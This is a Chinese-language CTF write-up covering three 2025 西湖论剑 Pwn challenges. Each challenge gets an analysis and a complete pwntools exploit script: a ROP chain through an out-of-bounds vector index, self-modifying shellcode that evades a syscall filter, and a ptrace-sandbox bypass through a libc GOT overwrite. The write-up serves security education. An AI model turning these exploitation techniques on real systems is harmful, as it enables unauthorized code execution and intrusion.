---
layout: post
title: "[Pwn] Writeup - 2025西湖论剑 - Pwn & IoT"
date: 2025-01-22 23:45 +0800

description: >-
  西湖论剑2025 Pwn 方向 WriteUp ，IoT 暂未更新 

categories: [CTF 相关, Pwn - 二进制安全 , 西湖论剑 , WriteUp]
tags: [CTF 相关, Pwn - 二进制安全 , 西湖论剑 , WriteUp]

---

## Pwn 题解

### 1. Vpwn

#### 1.1 分析

首先先看一眼题目的保护，可以看到保护全开，看来又是一道考验逻辑的题目

<img src="https://webimage.lufiende.work/1738665684424.png" alt="image-20250204184118111" style="zoom:67%;" />

接下来通过初步运行程序和审阅代码发现，题目使用了 `C++` 来恶心选手并且使用了 `Vector 容器` 

 <img src="https://webimage.lufiende.work/1738665856587.png" alt="image-20250204185632290" style="zoom: 80%;" />

由于 `Canary` 的存在，理论上，我们无法单纯通过添加数字覆盖返回地址而不触发保护，并且修改值的函数中有简单的检测，无法直接修改返回地址之类的位置

<img src="https://webimage.lufiende.work/1738666599005.png" alt="image-20250204185632291" style="zoom:67%;" />

进一步从程序流以及各个选项中的传参中可以探究出，该容器的地址对应着位于栈上的 `v8` 

<img src="https://webimage.lufiende.work/1738665601178.png" alt="image-20250204183954652" style="zoom: 80%;" />

我们可以清晰的看到 `v8` 的大小为 0x28 ，但是实际上不管是在 `sub_1840` 函数还是 `edit` 、`pop` 函数都以 `*(_QWORD *)(a1 / v8 + 24)` 作为索引，这里的 `a1` 是传入的 `v8` ，意思是该容器的索引位置是 **容器初始地址偏移 0x18 的位置** 

<img src="https://webimage.lufiende.work/1738666381650.png" alt="image-20250204185255096" style="zoom: 80%;" />

这意味着，我们可以**十分轻松的通过覆写索引，绕过检查，直接修改栈上对应的返回地址，甚至是在返回地址处布置 ROP 链条取得 Shell**

#### 1.2 可能需要的注意事项

##### 1.2.1 环境问题

由于题目使用了 `C++` ，若想本地达到十分接近远端的效果，除了修改 `libc.so.6` 以外，我们还需要额外指定符合版本的 `libm.so.6` 以及 `libstdc++.so.6` ，**简单的方法是直接使用对应版本的虚拟机**，例如这道题我们就需要使用 `Ubuntu 22.04` 来运行

##### 1.2.2 修改地址的手法

由于题目使用了 `cin` 这样十分 "智能" 的函数，我们需要**以数字的方式输入**而不是使用 `p32()` 打包，并且由于容器对数操作以 `int` 为单位，具有**长度限制以及正负符号位问题**，泄露基地址和修改地址均需要分成两部分处理，**这过程可能会造成接收或修改的数值大小有损失，需要通过动态调整来修改补足**，具体可见 `exp`

#### 1.3 exp

```python
#!/usr/bin/env python

'''
    author: Lufiende
'''

from pwn import *
from LibcSearcher import *
import ctypes

filename = "Vpwn_patched"
libcname = "/home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6_2.35-0ubuntu3.8_amd64/lib/x86_64-linux-gnu/libc.so.6"
filearch = 'amd64'
isAttach = 0
context.log_level = 'debug'
context.os = 'linux'
context.arch = filearch
context.terminal = ["/mnt/c/Windows/System32/cmd.exe", '/c', 'start', 'wsl.exe']

elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)

gdbscript = '''
b *$rebase(0x139f)
set debug-file-directory /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6-dbg_2.35-0ubuntu3.8_amd64/usr/lib/debug
set directories /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/glibc-source_2.35-0ubuntu3.8_all/usr/src/glibc/glibc-2.35
'''

processarg = {"LD_PRELOAD":"/home/lufiende/Tools/CTF/Pwn/Glibc/gcc/gcc-12-glibc2.35-ubuntu22-amd64/usr/lib/x86_64-linux-gnu/libstdc++.so.6:/home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6_2.35-0ubuntu3.8_amd64/lib/x86_64-linux-gnu/libm.so.6"}


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gdbscript, env=processarg)
    elif args.REMOTE:
        return remote(host, port)
    elif args.ATTACH:
        global isAttach
        isAttach = 1
        return process(elf.path, env=processarg)
    else:
        return process(elf.path, env=processarg)

def dbg():
    if isAttach:
        gdb.attach(io, gdbscript = gdbscript)

io = start()

############################################

def push(num):
    io.sendlineafter(b'choice: ', b'2')
    io.sendlineafter(b'push', str(num).encode())

def pop():
    io.sendlineafter(b'choice: ', b'3')

def show():
    io.sendlineafter(b'choice: ', b'4')

def edit(idx,num):
    io.sendlineafter(b'choice: ', b'1')
    io.sendlineafter(b'edit', str(idx).encode())
    io.sendlineafter(b'new', str(num).encode())

def int32(num):
    return ctypes.c_int32(num).value  # 匹配输入类型

# 00:0000│  0x7ffdfb061d60 ◂— 0x1e0000001e
# ... ↓     2 skipped
# 03:0018│  0x7ffdfb061d78 ◂— 0x1e 【控制位】
# 04:0020│  0x7ffdfb061d80 ◂— 0
# 05:0028│  0x7ffdfb061d88 ◂— 0x847fbc4547dee900
# 06:0030│  0x7ffdfb061d90 —▸ 0x7f21d0edd340 —▸ 0x7f21d0d387c0 ◂— endbr64
# 07:0038│  0x7ffdfb061d98 —▸ 0x7ffdfb061eb8 —▸ 0x7ffdfb063369 ◂— 0x432f662f746e6d2f ('/mnt/f/C')
# 08:0040│  0x7ffdfb061da0 ◂— 1
# 09:0048│  0x7ffdfb061da8 —▸ 0x7f21d0a8fd68 ◂— mov edi, eax 【off 18&19】
# 0a:0050│  0x7ffdfb061db0 ◂— 0x2e78786362696c67 ('glibcxx.') 【off 20&21】
# 0b:0058│  0x7ffdfb061db8 —▸ 0x559d30959329 ◂— endbr64 【off 22&23】
# 0c:0060│  0x7ffdfb061dc0 ◂— 0x1d0eeaf60 【off 24&25】

for i in range (7):
    push(30)

show()
io.recvuntil(b'1 0 ')
libc_leak_1 = int(io.recvuntil(b' ')[:-1])
sleep(0.5)
libc_leak_2 = int(io.recvuntil(b' ')[:-1]) + 1 # 根据动调进行了调整
libc_leak = libc_leak_1 + (libc_leak_2 << 32) 
libc.address = libc_leak - (0x7f38707c3d90 - 0x7f387079a000)
print(hex(libc.address))

pop_rdi = libc.address + 0x2a3e5
retn = pop_rdi + 1
binsh_addr = libc.search(b"/bin/sh").__next__()
system_addr = libc.sym['system']

print(hex(pop_rdi>>32), hex(pop_rdi&0xffffffff))

for i in range (18,25):
    edit(i, 0)

edit(18, int32(pop_rdi & 0x00000000ffffffff))
edit(19, int32(pop_rdi >> 32))
edit(20, int32(binsh_addr & 0x00000000ffffffff))
edit(21, int32(binsh_addr >> 32))
edit(22, int32(retn & 0x00000000ffffffff))
edit(23, int32(retn >> 32))
edit(24, int32(system_addr & 0x00000000ffffffff))
edit(25, int32(system_addr >> 32))

############################################

io.interactive()
```

### 2. Heaven's Door

> ~~黑蚊子多！你已经死了~~

#### 2.1 分析

一道 `Shellcode` 的题目，有沙箱，属于 `ORW` 的变式，目前是缺失了 `read()` 

<img src="https://webimage.lufiende.work/1738685380504.png" alt="image-20250205000932518" style="zoom:67%;" />

代码逻辑也十分简单，把 `Shellcode` 读到由 `mmap()` 申请的 `RWX` 空间中并执行，其中**会检查 `syscall` 的数量**，由于是遍历检查，哪怕没有超过数量，只要符合 `syscall` 机器码的序列 `0f 05` 重复超过两次就不行，**但是由于可写，可以靠运算在即将执行的位置通过运算算出一个 `0f 05` 也行**

<img src="https://webimage.lufiende.work/1738685443633.png" alt="image-20250205001036237" style="zoom:67%;" />

接下来就是寻找 `read()` 的替代品的时候，由于采用了白名单，基本上只能这几个函数中选择，即使转 32 位也无法调用 `read()` 以及和其替代品，可以考虑使用 ·`mmap()` ，它的定义是这样的

```c
void* mmap(void* start, size_t length, int prot, int flags, int fd, off_t offset);
```

- **`start`**：指向欲映射的内存起始地址，设为 `NULL` 代表让系统自动选定地址
- **`length`**：代表将文件中多大的部分映射到内存，一般 0x1000 对齐
- **`prot`**：映射区域的保护方式，可以是 `PROT_EXEC` 、``PROT_READ` 、`PROT_WRITE`、`PROT_NONE` 的组合
- **`flags`**：影响映射区域的各种特性，必须指定 `MAP_SHARED` 或 `MAP_PRIVATE`
- **`fd`**：要映射到内存中的文件描述符 
- **`offset`**：文件映射的偏移量，通常设置为0，代表从文件最前方开始对应，必须是分页大小的整数倍。

其中 `fd` 这一参数可以把打开的文件映射到内存，十分完美的替代了 `read()` 的功能

#### 2.2 exp

##### 2.2.1 Shellcode 源

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>

int main()
{
    int fd = 0;
    char path[] = "./flag";
    
    fd = open(path,0);
    mmap((void *)0x20000,0x1000,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE,fd,0);
    write(1,(void *)0x20000,0x100);

    return 0;
}
```

##### 2.2.2 完整脚本

```python
#!/usr/bin/env python

'''
    author: Lufiende
'''

from pwn import *
from LibcSearcher import *
import ctypes

filename = "pwn"
libcname = "/home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6_2.35-0ubuntu3.8_amd64/lib/x86_64-linux-gnu/libc.so.6"
filearch = 'amd64'
isAttach = 0
context.log_level = 'debug'
context.os = 'linux'
context.arch = filearch
context.terminal = ["/mnt/c/Windows/System32/cmd.exe", '/c', 'start', 'wsl.exe']

elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)

gdbscript = '''
b main
set debug-file-directory /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/libc6-dbg_2.35-0ubuntu3.8_amd64/usr/lib/debug
set directories /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.8/amd64/glibc-source_2.35-0ubuntu3.8_all/usr/src/glibc/glibc-2.35
'''

processarg = {}

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gdbscript, env=processarg)
    elif args.REMOTE:
        return remote(host, port)
    elif args.ATTACH:
        global isAttach
        isAttach = 1
        return process(elf.path, env=processarg)
    else:
        return process(elf.path, env=processarg)

def dbg():
    if isAttach:
        gdb.attach(io, gdbscript = gdbscript)
        
io = start()

############################################
shellcode = asm(
    '''
    mov rax, 0x67616c662f2e
    push rax
    mov rsi, 0
    mov rdi, rsp
    mov eax, 2
    syscall				// open()

    mov r8, rax
    mov r9, 0
    mov r10, 2
    mov rdx, 7
    mov rsi, 0x1000
    mov rdi, 0x20000
    mov rax, 9
    syscall				// mmap()

    mov rdx, 0x100
    mov rsi, 0x20000
    mov rdi, 1
    mov rax, 1			// write()
    
    mov r8, 0x0500		// 0f 05 小端序需要 0x050f = 0x0500 + 0x1 x 0xf
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    add r8, 1
    mov r9, 0x100b4
    mov [r9], r8	   // 构造 syscall ，正好在所有汇编语句后，即 0x100b4
    '''
)

dbg()

io.send(shellcode)

############################################

io.interactive()
```

### 3. Babytrace-v2

#### 3.1 分析

首先先看一眼题目的保护，保护全开，不免了又是一道花哨题

<img src="https://webimage.lufiende.work/1738687128305.png" alt="image-20250205003840845" style="zoom:67%;" />

看一下程序函数和逻辑，我们可以在主函数发现一个有趣的点，这个函数在使用 `ptrace` 监控自己（的子进程）执行的情况，就是 `gdb` 同款的那个 `ptrace` ，值得一提的是，你看到的这个是**我将 “是否被调试” 的检测 `nop` 的版本**，不然会无法调试

![image-20250205003629470](https://webimage.lufiende.work/1738686998263.png)

简单介绍一下，程序靠 `if...else..` 的判断方式，通过 `pid` 来确定程序是执行 `fork` 后的主进程还是子进程，正常来说，子进程的值是 0 ，主进程会获得子进程的值，其中子进程会执行 `if` 的代码，主进程会执行的，就是下面 `else` 的代码

我们先看子进程，其中修改某个偏移地址的值**由于采用了 `int` 类型而没对负数限制**，很容易靠负数进行向低地址的**越界读**，不过只能读两次，泄露两个地址也足够

![image-20250205011423103](https://webimage.lufiende.work/1738689271893.png)

还有一个负责对栈上某个值进行修改，和上文一样，可以向较低的地址进行**越界修改**，你可以修改一个位置很低的栈位置甚至是 `libc`  ，遗憾的是只能用一次

![image-20250205011649039](https://webimage.lufiende.work/1738689416330.png)



带有 `PTRACE_SETOPTIONS` 的函数会将调试选项设置为 1（PTRACE_O_TRACESYSGOOD），这个的用处是**陷入/结束系统调用时触发一个 *带特殊标记* 的 `SIGTRAP` **，方便区分普通信号与系统调用陷入事件

带有 `PTRACE_SYSCALL` 的函数会捕捉 `SIGTRAP` 信号，第一个进入系统调用的信号捕捉到后 `PTRACE_GETREGS` 就会获取寄存器的值，其中 `v8` 是 `rax`代表 `系统调用号` ，只能和 1 ，231 ，5 ，60 相等，而他们对应的是

1.  32 : 1 `exit` / 231 `fgetxattr` / 5 `open` / 60 `umask`

2.  64 : 1 `write` / 231 `exit_group` / 5` fstat` / 60 `exit`

看起来是 `orw` 但是没有 `read` 的代替十分头疼，但实际上其实暗藏玄只因，众所周知，`SIGTRAP` 是带特殊标记的，特殊在哪了呢，他会把中断号带上，它其实不光光是一个 `SIGTRAP` ，严格来讲是 `SIGTRAP | 0x80` ，但是很显然，**程序只检查了有无中断，并没有检测到你到底触发了什么中断**，也就是说，**你只要先随便塞个中断，程序会误以为是进入了一次系统调用，然后当你真的进入系统调用了之后他会以为你结束了调用，会按结束系统调用的中断来对你现在真进入的系统调用进行判断**，不过结束时的中断并没有判断，也就是说他的沙盒就是个笑话

接下来就是如何执行 `rop` 链的问题，由于只能对一个地址进行任意写，那么在 `one_gadget` 基本无法使用的情况下，我们能利用的也只能是 `magic_gadget` 利用对 `rsp` 的劫持和 `ret` 对执行流的控制来进行 `rop` 攻击

如果尝试直接修改返回地址的话，由于 `leave` 的原因，使用的栈会回到高位，我们需要减小 `rsp` 但是这类 `gadget` 不是很好找，但我们如果是进入一个函数的话，使用的栈会向低处延申，我们可以很容易找到增加的，至于进入函数的问题，我们可以考虑**修改 `libc 中的 got` 并配合一个 `add rsp, 0xXX; ret` 来控制执行流**

#### 3.2 可能需要的注意事项

##### 3.2.1 `gadget` 寻找问题

经测试，`ROP Gadget` 无法找到其他中断（也可能是我不会），这里使用 `ropper` 加载文件后使用 `search int` 可从 `libc` 轻松找出，不过这个是从其他语句中截取的而已

##### 3.2.2 `libcgot` 寻找问题

若跟踪库函数寻找可以使用的 `libcgot` 感觉困难时，可以直接调试进入到函数中，然后靠函数地址 `search -p` 寻找 `got` 表

##### 3.2.3 调试问题

若 `attach` 方法不成功可尝试 `io = gdb.debug(path)` 的方法

#### 3.3 exp

```python
#!/usr/bin/env python

'''
    author: Lufiende
'''

from pwn import *
from LibcSearcher import *

filename = "babytrace_nop_patched"
libcname = "/home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.5/amd64/libc6_2.35-0ubuntu3.5_amd64/lib/x86_64-linux-gnu/libc.so.6"
filearch = 'amd64'

context.log_level = 'debug'
context.os = 'linux'
context.arch = filearch
context.terminal = ["/mnt/c/Windows/System32/cmd.exe", '/c', 'start', 'wsl.exe']

elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)

gdbscript = '''
b *$rebase(0xC70)
b *$rebase(0xD57)
set debug-file-directory /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.5/amd64/libc6-dbg_2.35-0ubuntu3.5_amd64/usr/lib/debug
set directories /home/lufiende/Tools/CTF/Pwn/Glibc/pkgs/2.35-0ubuntu3.5/amd64/glibc-source_2.35-0ubuntu3.5_all/usr/src/glibc/glibc-2.35
'''

isAttach = 0
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    elif args.ATTACH:
        global isAttach
        isAttach = 1
        return process(host, port)
    else:
        return process(elf.path)

def dbg():
    if isAttach:
        gdb.attach(io, gdbscript = gdbscript)

io = start()

############################################
io.sendlineafter(b'one',b'2')
io.sendlineafter(b'one',b'-2')

io.recvuntil(b'num[-2] = ')
libc_base = int(io.recv(15)) - libc.sym['_IO_2_1_stderr_']
print(hex(libc_base))

io.sendlineafter(b'one',b'2')
io.sendlineafter(b'one',b'-4')

io.recvuntil(b'num[-4] = ')
stack_leak = int(io.recv(15))
print(hex(stack_leak))

int1 = libc_base + 0xc6d6e
pop_rdi = libc_base + 0x2a3e5
pop_rsi = libc_base + 0x1518b3
pop_rdx = libc_base + 0x796a2
pop_rax = libc_base + 0x45eb0
syscall = libc_base + 0x91316
leave = libc_base + 0x4da83
binsh_addr = libc_base + libc.search(b'/bin/sh').__next__()
ropchain = b'a' * 0x10
ropchain += p64(int1)
ropchain += p64(pop_rdi)
ropchain += p64(binsh_addr)
ropchain += p64(pop_rsi)
ropchain += p64(0)
ropchain += p64(pop_rdx)
ropchain += p64(0)
ropchain += p64(pop_rax)
ropchain += p64(59)
ropchain += p64(syscall)
payload1 = ropchain

strlen_evex_got = 0x7f84ce7bb098 - 0x7f84ce5a2000 + libc_base
stack_offset_base = stack_leak - 0x20
edit_offset = (strlen_evex_got - stack_offset_base) // 8
print(edit_offset)
gadget = libc_base + 0x1144e6

io.sendlineafter(b'one',b'1')
io.sendlineafter(b'recv',payload1)
io.sendlineafter(b'one',str(edit_offset).encode())
io.sendlineafter(b'value',str(gadget).encode())

############################################

io.interactive()
```

IoT 等待更新......
